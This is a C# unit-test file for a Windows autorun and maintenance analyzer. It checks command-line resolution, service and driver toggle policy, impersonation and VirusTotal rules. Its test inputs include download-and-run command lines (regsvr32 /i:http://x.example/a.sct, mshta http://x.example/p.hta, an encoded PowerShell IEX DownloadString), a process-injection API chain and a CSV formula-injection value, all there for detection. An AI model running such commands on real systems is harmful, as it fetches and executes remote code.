using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Bakım.Core.Analyzer;
using Xunit;

namespace Bakim.Core.Tests;

/// <summary>Analizör v3 Faz 0: komut satırı çözümleyici, eylem politikası, tehdit kuralları.</summary>
public class AnalyzerFaz0Tests
{
    private static readonly HashSet<string> Files = new(StringComparer.OrdinalIgnoreCase)
    {
        @"C:\Windows\explorer.exe",
        @"C:\Windows\System32\userinit.exe",
        @"C:\Windows\System32\rundll32.exe",
        @"C:\Windows\System32\regsvr32.exe",
        @"C:\Windows\System32\cmd.exe",
        @"C:\Windows\System32\wscript.exe",
        @"C:\Windows\System32\mshta.exe",
        @"C:\Windows\System32\conhost.exe",
        @"C:\Windows\System32\shell32.dll",
        @"C:\Windows\System32\drivers\disk.sys",
        @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        @"C:\Program Files\Notepad++\notepad++.exe",
        @"C:\Program Files (x86)\Steam\steam.exe",
        @"C:\Program Files\AMD\RyzenMaster\bin\AMD Ryzen Master SDK.exe",
        @"C:\Riot Games\Riot Client\RiotClientServices.exe",
        @"C:\Users\u\AppData\Roaming\evil\payload.dll",
        @"C:\Users\u\AppData\Roaming\evil\run.vbs",
        @"C:\Users\u\AppData\Roaming\evil\a.ps1",
        @"C:\Users\u\AppData\Local\Discord\Update.exe",
    };

    private static readonly ResolverEnvironment Env = new()
    {
        FileExists = Files.Contains,
        Expand = s => s.Replace("%windir%", @"C:\Windows", StringComparison.OrdinalIgnoreCase)
                       .Replace("%SystemRoot%", @"C:\Windows", StringComparison.OrdinalIgnoreCase)
                       .Replace("%APPDATA%", @"C:\Users\u\AppData\Roaming", StringComparison.OrdinalIgnoreCase),
        WindowsDirectory = @"C:\Windows",
        SearchDirectories = new[] { @"C:\Windows\System32\WindowsPowerShell\v1.0" }
    };

    private static ResolvedCommand R(string raw) => CommandLineResolver.Resolve(raw, Env);

    // ---- Z6: komut satırı çözümleyici ----

    [Theory]
    // Tırnaksız boşluklu yol: eskiden "C:\Program" oluyordu.
    [InlineData(@"C:\Program Files\AMD\RyzenMaster\bin\AMD Ryzen Master SDK.exe", @"C:\Program Files\AMD\RyzenMaster\bin\AMD Ryzen Master SDK.exe", "")]
    [InlineData(@"C:\Riot Games\Riot Client\RiotClientServices.exe --launch-background-mode", @"C:\Riot Games\Riot Client\RiotClientServices.exe", "--launch-background-mode")]
    [InlineData(@"""C:\Program Files (x86)\Steam\steam.exe"" -silent", @"C:\Program Files (x86)\Steam\steam.exe", "-silent")]
    // Winlogon değerleri: sondaki virgül ve göreli ad.
    [InlineData(@"C:\Windows\system32\userinit.exe,", @"C:\Windows\System32\userinit.exe", "")]
    [InlineData("explorer.exe", @"C:\Windows\explorer.exe", "")]
    [InlineData("explorer", @"C:\Windows\explorer.exe", "")]
    // Sürücü yolları.
    [InlineData(@"\SystemRoot\System32\drivers\disk.sys", @"C:\Windows\System32\drivers\disk.sys", "")]
    [InlineData(@"System32\drivers\disk.sys", @"C:\Windows\System32\drivers\disk.sys", "")]
    [InlineData(@"\??\C:\Windows\System32\drivers\disk.sys", @"C:\Windows\System32\drivers\disk.sys", "")]
    [InlineData(@"%windir%\explorer.exe /n", @"C:\Windows\explorer.exe", "/n")]
    public void Resolver_ResolvesRealPaths(string raw, string file, string args)
    {
        var r = R(raw);
        Assert.Equal(TargetResolution.Resolved, r.Resolution);
        Assert.Equal(file, r.FilePath, ignoreCase: true);
        Assert.Equal(args, r.Arguments);
    }

    [Fact]
    public void Resolver_MissingFile_IsNotFound_WithSensiblePath()
    {
        var r = R(@"C:\Users\u\Desktop\lb_inj.exe");
        Assert.Equal(TargetResolution.NotFound, r.Resolution);
        Assert.Equal(@"C:\Users\u\Desktop\lb_inj.exe", r.FilePath);

        var spaced = R(@"C:\Program Files\Gone App\gone.exe --tray");
        Assert.Equal(TargetResolution.NotFound, spaced.Resolution);
        Assert.Equal(@"C:\Program Files\Gone App\gone.exe", spaced.FilePath);
        Assert.Equal("--tray", spaced.Arguments);

        Assert.Equal(TargetResolution.Empty, R("  ").Resolution);
    }

    [Fact]
    public void Resolver_Unwraps_Rundll32_And_Regsvr32()
    {
        var r = R(@"rundll32.exe ""%APPDATA%\evil\payload.dll"",Start");
        Assert.Equal("rundll32", r.HostName);
        Assert.True(r.PayloadFound);
        Assert.Equal(@"C:\Users\u\AppData\Roaming\evil\payload.dll", r.EffectiveTarget);

        var sys = R("rundll32.exe shell32.dll,Control_RunDLL");
        Assert.Equal(@"C:\Windows\System32\shell32.dll", sys.EffectiveTarget, ignoreCase: true);

        var squiblydoo = R("regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll");
        Assert.Equal("regsvr32", squiblydoo.HostName);
        Assert.Equal("http://x.example/a.sct", squiblydoo.InlineScript);
    }

    [Fact]
    public void Resolver_Unwraps_Scripts()
    {
        var vbs = R(@"wscript.exe //B ""%APPDATA%\evil\run.vbs""");
        Assert.Equal(@"C:\Users\u\AppData\Roaming\evil\run.vbs", vbs.EffectiveTarget);

        var file = R(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""%APPDATA%\evil\a.ps1""");
        Assert.Equal("powershell", file.HostName);
        Assert.Equal(@"C:\Users\u\AppData\Roaming\evil\a.ps1", file.EffectiveTarget);

        string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://x')"));
        var enc = R($"powershell -w hidden -enc {encoded}");
        Assert.Contains("DownloadString", enc.InlineScript);
        Assert.Equal(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", enc.EffectiveTarget, ignoreCase: true);

        var cmd = R(@"cmd.exe /c start """" ""C:\Users\u\AppData\Local\Discord\Update.exe"" --processStart Discord.exe");
        Assert.Equal("cmd", cmd.HostName);
        Assert.NotNull(cmd.InlineScript);

        var hta = R("mshta.exe http://x.example/p.hta");
        Assert.Equal("http://x.example/p.hta", hta.InlineScript);
    }

    [Fact]
    public void Resolver_NormalizesNtPrefixes()
    {
        Assert.Equal(@"C:\Windows\System32\x.sys", CommandLineResolver.NormalizeLeadingPath(@"\SystemRoot\System32\x.sys", @"C:\Windows"));
        Assert.Equal(@"""C:\Windows\System32\x.sys""", CommandLineResolver.NormalizeLeadingPath(@"""\SystemRoot\System32\x.sys""", @"C:\Windows"));
        Assert.Equal(@"C:\a.exe", CommandLineResolver.NormalizeLeadingPath(@"\??\C:\a.exe", @"C:\Windows"));
        Assert.Equal(@"C:\Program Files\a.exe", CommandLineResolver.NormalizeLeadingPath(@"C:\Program Files\a.exe", @"C:\Windows"));
    }

    [Fact]
    public void Resolver_Tokenize_And_DecodePowerShell()
    {
        Assert.Equal(new[] { "-File", @"C:\a b\c.ps1", "-x" }, CommandLineResolver.Tokenize(@"-File ""C:\a b\c.ps1"" -x"));
        Assert.Null(CommandLineResolver.DecodePowerShell("not base64!"));
    }

    // ---- Z1: eylem politikası ----

    [Theory]
    [InlineData(0, 1)]   // açılış sürücüsü
    [InlineData(1, 1)]   // sistem sürücüsü
    [InlineData(2, 1)]   // otomatik ama türü sürücü
    [InlineData(3, 2)]   // dosya sistemi sürücüsü
    public void Policy_Drivers_NeverToggleable(int start, int type)
    {
        var f = new AutorunFacts(AutorunCategory.WindowsService, ServiceName: "disk", ServiceStart: start, ServiceType: type);
        Assert.False(AutorunActionPolicy.CanToggle(f).Allowed);
        Assert.False(AutorunActionPolicy.CanDelete(f).Allowed);
        Assert.False(AutorunActionPolicy.CanToggle(f with { Category = AutorunCategory.Driver }).Allowed);
    }

    [Fact]
    public void Policy_Services()
    {
        Assert.True(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.WindowsService, ServiceName: "SteamClient", ServiceStart: 2, ServiceType: 0x10)).Allowed);
        Assert.False(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.WindowsService, ServiceName: "RpcSs", ServiceStart: 2, ServiceType: 0x20)).Allowed);
        Assert.False(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.WindowsService, ServiceName: "Foo", ServiceStart: 3, ServiceType: 0x10)).Allowed);
        // Bakım'ın kapattığı hizmet yeniden açılabilir.
        Assert.True(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.WindowsService, ServiceName: "Foo", ServiceStart: 4, ServiceType: 0x10, DisabledByBakim: true)).Allowed);
        Assert.False(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.WindowsService, ServiceName: "Foo", ServiceStart: 4, ServiceType: 0x10)).Allowed);
    }

    [Fact]
    public void Policy_RestoreStartType_NeverBootOrSystem()
    {
        Assert.Equal((2, true), AutorunActionPolicy.RestoreStartType(2, true));
        Assert.Equal((3, false), AutorunActionPolicy.RestoreStartType(3, true));
        Assert.Equal((2, false), AutorunActionPolicy.RestoreStartType(0, false));
        Assert.Equal((2, false), AutorunActionPolicy.RestoreStartType(1, false));
        Assert.Equal((2, false), AutorunActionPolicy.RestoreStartType(null, false));
    }

    [Fact]
    public void Policy_OtherCategories()
    {
        Assert.True(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.RegistryRun, RegistryKeyPath: @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run")).Allowed);
        Assert.False(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.RegistryRun, RegistryKeyPath: @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce")).Allowed);
        Assert.True(AutorunActionPolicy.CanDelete(new AutorunFacts(AutorunCategory.RegistryRun, RegistryKeyPath: @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce")).Allowed);
        Assert.False(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.ScheduledTask, TaskPath: @"\Microsoft\Windows\Defrag\ScheduledDefrag")).Allowed);
        Assert.False(AutorunActionPolicy.CanDelete(new AutorunFacts(AutorunCategory.ScheduledTask, TaskPath: @"\Microsoft\Windows\Defrag\ScheduledDefrag")).Allowed);
        Assert.True(AutorunActionPolicy.CanToggle(new AutorunFacts(AutorunCategory.ScheduledTask, TaskPath: @"\GoogleUpdaterTaskUser")).Allowed);
        foreach (var c in new[] { AutorunCategory.WmiEventConsumer, AutorunCategory.WinlogonIfeo, AutorunCategory.ShellExtension, AutorunCategory.InspectedFile })
        {
            Assert.False(AutorunActionPolicy.CanToggle(new AutorunFacts(c)).Allowed);
            Assert.False(AutorunActionPolicy.CanDelete(new AutorunFacts(c)).Allowed);
            Assert.NotEmpty(AutorunActionPolicy.CanToggle(new AutorunFacts(c)).Reason);
        }
    }

    // ---- Z3: sistem ikilisi taklidi ----

    [Theory]
    [InlineData(@"C:\Windows\explorer.exe", false)]
    [InlineData(@"C:\Windows\SysWOW64\explorer.exe", false)]
    [InlineData(@"C:\Windows\System32\svchost.exe", false)]
    [InlineData(@"C:\Windows\svchost.exe", true)]
    [InlineData(@"C:\Users\u\AppData\Roaming\explorer.exe", true)]
    [InlineData(@"C:\Users\u\AppData\Local\Temp\lsass.exe", true)]
    [InlineData(@"C:\Program Files\App\app.exe", false)]
    public void SystemBinary_Impersonation(string path, bool expected) =>
        Assert.Equal(expected, SystemBinaryLocations.IsImpersonation(path, @"C:\Windows"));

    // ---- Z4: VirusTotal ----

    [Fact]
    public void VirusTotal_Consensus_IsDominant()
    {
        Assert.Null(VirusTotalRules.Evaluate(0, 0, 72));
        Assert.Null(VirusTotalRules.Evaluate(0, 0, 0));
        var many = VirusTotalRules.Evaluate(60, 2, 72)!.Value;
        Assert.True(many.MinimumScore >= 75 && many.Critical);
        var ratio = VirusTotalRules.Evaluate(8, 4, 60)!.Value; // (8+2)/60 = %16,7
        Assert.True(ratio.MinimumScore >= 75);
        var few = VirusTotalRules.Evaluate(4, 0, 72)!.Value;
        Assert.Equal(55, few.MinimumScore);
        var one = VirusTotalRules.Evaluate(1, 0, 72)!.Value;
        Assert.Equal(0, one.MinimumScore);
        Assert.False(one.Critical);
    }

    // ---- Z5: API birleşimleri ----

    [Fact]
    public void Imports_CommonGuiApis_AreNotEvidence()
    {
        var notepadLike = new[] { "GetKeyState", "GetClipboardData", "SetWindowsHookExW", "OpenProcess", "RegSetValueExW", "VirtualAllocEx", "WriteProcessMemory" };
        Assert.Empty(ImportRules.Evaluate(notepadLike, trustedSigned: true));
        Assert.Empty(ImportRules.Evaluate(notepadLike, trustedSigned: false)); // zincir eksik: çalıştırma API'si yok
    }

    [Fact]
    public void Imports_FullInjectionChain()
    {
        var chain = new[] { "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread" };
        var unsigned = ImportRules.Evaluate(chain, trustedSigned: false);
        Assert.Single(unsigned);
        Assert.True(unsigned[0].Critical);
        Assert.True(unsigned[0].Impact > 0);

        var signed = ImportRules.Evaluate(chain, trustedSigned: true);
        Assert.Single(signed);
        Assert.Equal(0, signed[0].Impact);
        Assert.False(signed[0].Critical);
    }

    [Theory]
    [InlineData("SetWindowsHookExW", "SetWindowsHookEx")]
    [InlineData("URLDownloadToFileA", "URLDownloadToFile")]
    [InlineData("QueueUserAPC", "QueueUserAPC")]
    [InlineData("ShowWindow", "ShowWindow")]
    public void Imports_NormalizeSuffix(string name, string expected) => Assert.Equal(expected, ImportRules.Normalize(name));

    // ---- AN-22: argümanlar ----

    [Fact]
    public void Arguments_AreTokenMatched()
    {
        Assert.True(ArgumentRules.HasHiddenWindow(CommandLineResolver.Tokenize("-NoP -W Hidden -c x")));
        Assert.False(ArgumentRules.HasHiddenWindow(CommandLineResolver.Tokenize("/startup /systray")));
        Assert.True(ArgumentRules.HasEncodedCommand(CommandLineResolver.Tokenize("-enc AAAA")));
        Assert.False(ArgumentRules.HasEncodedCommand(CommandLineResolver.Tokenize("--encoding=utf8")));
        Assert.True(ArgumentRules.HasNoProfileBypass(CommandLineResolver.Tokenize("-nop -ep bypass")));
    }

    // ---- Faz 1: tarayıcı eklentileri ve yeni kategoriler ----

    [Fact]
    public void Extensions_CommonBlockersAreLowRisk_ForcedOffStoreIsHigh()
    {
        var adblock = ExtensionRules.Evaluate(false, null, new[] { "<all_urls>", "webRequest", "storage" });
        Assert.InRange(adblock.Risk, 1, 29);
        Assert.Contains("ağ trafiğini", adblock.Notes);

        var passwordManager = ExtensionRules.Evaluate(false, null, new[] { "nativeMessaging", "tabs" });
        Assert.Equal(0, passwordManager.Risk);

        var forcedStore = ExtensionRules.Evaluate(true, "https://clients2.google.com/service/update2/crx", Array.Empty<string>());
        Assert.Equal(10, forcedStore.Risk);

        var forcedOffStore = ExtensionRules.Evaluate(true, "https://cdn.evil.example/update.xml", new[] { "<all_urls>", "webRequestBlocking" });
        Assert.True(forcedOffStore.Risk >= 45);
        Assert.Contains("Mağaza dışı", forcedOffStore.Notes);
    }

    [Theory]
    [InlineData("__MSG_appName__", "appName")]
    [InlineData("__MSG_extName__", "extName")]
    [InlineData("uBlock Origin", null)]
    [InlineData("__MSG___", null)]
    public void Extensions_MessageKey(string name, string? key) => Assert.Equal(key, ExtensionRules.MessageKey(name));

    [Fact]
    public void Policy_NewCategories_AreReadOnly()
    {
        foreach (var c in new[] { AutorunCategory.SystemHook, AutorunCategory.BrowserExtension, AutorunCategory.OfficeAddin })
        {
            Assert.False(AutorunActionPolicy.CanToggle(new AutorunFacts(c)).Allowed);
            Assert.False(AutorunActionPolicy.CanDelete(new AutorunFacts(c)).Allowed);
            Assert.NotEmpty(AutorunActionPolicy.CanToggle(new AutorunFacts(c)).Reason);
        }
    }

    // ---- AN-16: CSV ----

    [Theory]
    [InlineData("normal", "\"normal\"")]
    [InlineData("a\"b", "\"a\"\"b\"")]
    [InlineData("=cmd|' /C calc'!A0", "\"'=cmd|' /C calc'!A0\"")]
    [InlineData("-2+3", "\"'-2+3\"")]
    [InlineData(null, "\"\"")]
    public void Csv_EscapesFormulas(string? value, string expected) => Assert.Equal(expected, CsvText.Field(value));
}
